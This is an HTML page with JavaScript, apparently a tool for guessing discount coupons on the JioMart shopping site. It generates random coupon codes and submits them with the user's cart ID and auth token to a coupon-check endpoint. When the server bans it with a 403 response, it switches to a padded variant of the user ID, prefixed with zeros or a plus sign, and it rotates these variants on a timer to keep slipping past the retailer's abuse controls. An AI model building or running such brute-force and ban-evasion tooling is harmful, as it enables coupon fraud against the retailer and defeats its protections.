<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>JioMart Coupon Generator & Checker</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="p-4 bg-light">
  <div class="container">
    <h1 class="mb-4">üéüÔ∏è JioMart Coupon</h1>

    <!-- User Inputs -->
    <form id="configForm" class="row g-3 mb-4">
      <div class="col-md-6">
        <label class="form-label">Cart ID</label>
        <input class="form-control" id="cartId" required>
      </div>
      <div class="col-md-6">
        <label class="form-label">Auth Token</label>
        <input class="form-control" id="authToken" required>
      </div>
      <div class="col-md-6">
        <label class="form-label">User ID</label>
        <input class="form-control" id="userId" required>
      </div>
      <div class="col-md-6">
        <label class="form-label">PINCODE</label>
        <input class="form-control" id="pin" required>
      </div>
      <div class="col-md-6">
        <label class="form-label">How many coupons to test?</label>
        <input type="number" class="form-control" id="count" value="10" min="1" max="200">
      </div>
      <div class="col-md-6">
        <label class="form-label">Prefix (optional)</label>
        <input class="form-control" id="prefix" placeholder="e.g. 1J7M">
      </div>
      <div class="col-12">
        <button class="btn btn-primary w-100">Generate & Check</button>
      </div>
    </form>

    <!-- Results Table -->
    <div class="card shadow-sm">
  <div class="card-body">
    <h4>Results</h4>
    <div style="max-height: 400px; overflow-y: auto;">
      <table class="table table-bordered table-striped">
        <thead class="table-light sticky-top">
          <tr>
            <th>Coupon</th>
            <th>Status</th>
            <th>Message</th>
            <th>Using User ID</th>
          </tr>
        </thead>
        <tbody id="resultTable"></tbody>
      </table>
    </div>
  </div>
</div>

<script>
  // ------------------------------
  // Coupon Generator
  // ------------------------------
  function generateCoupon(prefixInput = "") {
    const digits = "0123456789";
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    let code = (prefixInput || "").toUpperCase();
    if (code.length > 10) code = code.slice(0, 10);

    let nextShouldBeDigit;
    if (code.length === 0) {
      nextShouldBeDigit = true;
    } else {
      const lastChar = code[code.length - 1];
      nextShouldBeDigit = isNaN(lastChar);
    }

    while (code.length < 10) {
      if (nextShouldBeDigit) {
        code += digits[Math.floor(Math.random() * digits.length)];
      } else {
        code += letters[Math.floor(Math.random() * letters.length)];
      }
      nextShouldBeDigit = !nextShouldBeDigit;
    }
    return code;
  }

  // ------------------------------
  // User ID Rotation Manager
  // ------------------------------
  function* userIdGenerator(baseUserId) {
    // First phase: prepend up to 127 zeros
    for (let i = 1; i <= 127; i++) {
      yield "0".repeat(i) + baseUserId;
    }
    // Second phase: prepend + with up to 125 zeros
    for (let i = 1; i <= 125; i++) {
      yield "+" + "0".repeat(i) + baseUserId;
    }
  }

  // ------------------------------
  // Helpers
  // ------------------------------
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  // ------------------------------
  // Main Script
  // ------------------------------
  document.getElementById("configForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const cartId = document.getElementById("cartId").value;
    const authToken = document.getElementById("authToken").value;
    const baseUserId = document.getElementById("userId").value;
    const pin = document.getElementById("pin").value;
    const count = parseInt(document.getElementById("count").value);
    const prefix = document.getElementById("prefix").value.trim();

    const tableBody = document.getElementById("resultTable");
    tableBody.innerHTML = "";

    // User ID rotation
    const userIds = userIdGenerator(baseUserId);
    let currentUserId = baseUserId;
    let couponCounter = 0;

    for (let i = 0; i < count; i++) {
      const coupon = generateCoupon(prefix);

      const row = document.createElement("tr");
      row.innerHTML = `
        <td>${coupon}</td>
        <td>‚è≥ Checking...</td>
        <td></td>
        <td>${currentUserId}</td>
      `;
      tableBody.appendChild(row);

      try {
        const res = await fetch("/api/check-coupon", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ coupon, cartId, authToken, userId: currentUserId, pin }),
        });

        if (res.status === 403) {
          // üö® Banned ‚Üí switch immediately
          const nextId = userIds.next();
          if (!nextId.done) {
            currentUserId = nextId.value;
            console.warn("‚ö†Ô∏è 403 detected ‚Üí switched User ID to:", currentUserId);
          }
          i--; // retry same coupon with new userId
          row.remove();
          continue;
        }

        const data = await res.json();

        if (data.result?.status === "success" || data.result?.result?.[0]?.applicable) {
          row.cells[1].innerHTML = "‚úÖ Valid";
          row.cells[2].innerHTML = "Discount applied!";
          tableBody.insertBefore(row, tableBody.firstChild);
          row.className = "table-success";
        } else {
          row.cells[1].innerHTML = "‚ùå Invalid";
          row.cells[2].innerHTML = data.result?.reason?.reason_eng || "Unknown";
          row.className = "table-danger";
        }
      } catch (err) {
        row.cells[1].innerHTML = "‚ö†Ô∏è Error";
        row.cells[2].innerHTML = err.message;
        row.className = "table-warning";
      }

      couponCounter++;

      // üîÑ Rotate User ID every 8 coupons
      if (couponCounter % 6 === 0) {
        const nextId = userIds.next();
        if (!nextId.done) {
          currentUserId = nextId.value;
          console.log("üîÑ Switched User ID to:", currentUserId);
        }
      }

      // Wait 10s unless we‚Äôre switching due to 403
      if (i < count - 1) {
        await sleep(10000);
      }
    }
  });
</script>

</body>
</html>
